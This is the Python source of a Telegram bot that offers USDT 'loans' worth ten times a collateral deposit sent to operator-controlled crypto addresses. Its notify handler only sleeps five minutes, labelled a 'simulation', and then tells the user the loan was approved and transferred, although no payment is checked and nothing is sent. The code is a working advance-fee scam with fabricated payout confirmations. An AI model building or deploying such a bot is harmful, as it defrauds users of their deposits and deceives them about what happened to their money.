from keep_alive import keep_alive
keep_alive()

import asyncio
import os
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.utils.markdown import code
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_TG_ID = int(os.getenv("ADMIN_TG_ID", "0"))

# Set deposit addresses per network:
DEPOSIT_ADDRESSES = {
    "TRC20": os.getenv("DEPOSIT_ADDRESS_TRC20", "TYourTronDepositAddressHere"),
    "BEP20": os.getenv("DEPOSIT_ADDRESS_BEP20", "0xYourBSCDepositAddressHere"),
    "ERC20": os.getenv("DEPOSIT_ADDRESS_ERC20", "0xYourEthereumDepositAddressHere"),
}

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

loan_packages = {
    50: 500,
    100: 1000,
    150: 1500,
    200: 2000,
}

class LoanApplication(StatesGroup):
    waiting_for_network = State()
    waiting_for_wallet = State()
    waiting_for_collateral = State()  # optional if you want user to pick collateral after wallet
    waiting_for_notify = State()

@dp.message(Command("start"))
async def start(message: types.Message):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💸 Apply Loan", callback_data="apply_loan")],
        [InlineKeyboardButton(text="💰 Repay Loan", callback_data="repay_loan")]
    ])
    await asyncio.sleep(1.5)
    await message.answer(
        "👋 Welcome to *USDT Loan Wallet Bot*\n\n"
        "Select an option below:",
        parse_mode="Markdown",
        reply_markup=keyboard
    )

@dp.callback_query(F.data == "apply_loan")
async def apply_loan_start(callback: types.CallbackQuery, state: FSMContext):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="TRC20 (Tron)", callback_data="net_TRC20")],
        [InlineKeyboardButton(text="BEP20 (Binance Smart Chain)", callback_data="net_BEP20")],
        [InlineKeyboardButton(text="ERC20 (Ethereum)", callback_data="net_ERC20")],
    ])
    await asyncio.sleep(1.5)
    await callback.message.answer(
        "🌐 Choose the network where you will deposit collateral and receive the USDT loan:",
        reply_markup=keyboard
    )
    await state.set_state(LoanApplication.waiting_for_network)
    await asyncio.sleep(1.5)
    await callback.answer()

@dp.callback_query(F.data.startswith("net_"), LoanApplication.waiting_for_network)
async def network_selected(callback: types.CallbackQuery, state: FSMContext):
    network = callback.data.split("_")[1]
    await state.update_data(network=network)
    await callback.message.answer(
        f"✅ Network selected: *{network}*\n\n"
        "Please send me your wallet address on this network where you want to receive your USDT loan.",
        parse_mode="Markdown"
    )
    await state.set_state(LoanApplication.waiting_for_wallet)
    await callback.answer()

@dp.message(LoanApplication.waiting_for_wallet)
async def wallet_received(message: types.Message, state: FSMContext):
    wallet = message.text.strip()
    data = await state.get_data()
    network = data.get("network")

    # Simple validation for address format per network
    valid = False
    if network == "ERC20" or network == "BEP20":
        # Basic check for Ethereum-like address
        if wallet.startswith("0x") and len(wallet) == 42:
            valid = True
    elif network == "TRC20":
        # Basic check for Tron address (starts with T and length 34)
        if wallet.startswith("T") and len(wallet) == 34:
            valid = True

    if not valid:
        await message.reply(f"❌ That doesn't look like a valid {network} wallet address. Please send a correct address.")
        return

    await state.update_data(user_wallet=wallet)

    # Now ask user to pick collateral amount
    buttons = [
        InlineKeyboardButton(text=f"{collateral} USDT collateral → {loan} USDT loan", callback_data=f"collateral_{collateral}")
        for collateral, loan in loan_packages.items()
    ]
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[btn] for btn in buttons])

    await asyncio.sleep(1.5)
    await message.answer(
        "Choose your collateral amount:",
        reply_markup=keyboard
    )
    await state.set_state(LoanApplication.waiting_for_collateral)

@dp.callback_query(F.data.startswith("collateral_"), LoanApplication.waiting_for_collateral)
async def collateral_selected(callback: types.CallbackQuery, state: FSMContext):
    collateral = int(callback.data.split("_")[1])
    data = await state.get_data()
    network = data.get("network")
    user_wallet = data.get("user_wallet")
    loan_amount = loan_packages.get(collateral)
    deposit_address = DEPOSIT_ADDRESSES.get(network)

    await state.update_data(collateral=collateral, loan_amount=loan_amount)

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📢 Notify Admin When Paid", callback_data="notify_admin")]
    ])

    await asyncio.sleep(1.5)
    await callback.message.answer(
        f"🏦 *Loan Details*\n\n"
        f"🌐 Network: *{network}*\n"
        f"💰 Collateral: *{collateral} USDT*\n"
        f"💵 Loan Amount: *{loan_amount} USDT*\n\n"
        f"📥 Please send exactly *{collateral} USDT* to the deposit address below:\n"
        f"`{deposit_address}`\n\n"
        f"Your loan amount will be sent to your wallet address:\n"
        f"`{user_wallet}`\n\n"
        "⚠️ Make sure you send the exact amount on the selected network.\n"
        "After sending, click the button below to notify admin.",
        parse_mode="Markdown",
        reply_markup=keyboard
    )
    await state.set_state(LoanApplication.waiting_for_notify)
    await asyncio.sleep(1.5)
    await callback.answer()

@dp.callback_query(F.data == "notify_admin", LoanApplication.waiting_for_notify)
async def notify_admin(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    collateral = data.get("collateral")
    loan_amount = data.get("loan_amount")
    network = data.get("network")
    user_wallet = data.get("user_wallet")

    username = callback.from_user.username or str(callback.from_user.id)

    # Notify admin
    try:
        await bot.send_message(
            ADMIN_TG_ID,
            f"📢 *New Loan Payment Notification*\n\n"
            f"👤 User: {code(username)}\n"
            f"🌐 Network: {network}\n"
            f"💰 Collateral deposited: {collateral} USDT\n"
            f"💵 Loan amount requested: {loan_amount} USDT\n"
            f"🏦 User's receiving wallet: {code(user_wallet)}",
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"Failed to notify admin: {e}")

    await asyncio.sleep(1.5)
    await callback.message.answer(
        "✅ *Admin has been notified.*\n\n"
        "⏳ Please wait while your payment is verified.\n"
        "Your loan will be processed within *5 minutes*.\n\n"
        "💡 Do not close this chat — you will receive an update automatically.",
        parse_mode="Markdown"
    )
    await callback.answer()

    await asyncio.sleep(300)  # wait 5 mins simulation

    try:
        await bot.send_message(
            callback.from_user.id,
            f"🎉 *Loan Approved!*\n\n"
            f"💵 Amount disbursed: *{loan_amount} USDT*\n"
            f"📤 Transferred to your wallet: {code(user_wallet)}\n\n"
            "Thank you for using *ETH Loan Wallet Bot*! 🚀",
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"Failed to send final message: {e}")

    await state.clear()

async def main():
    print("Bot started!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
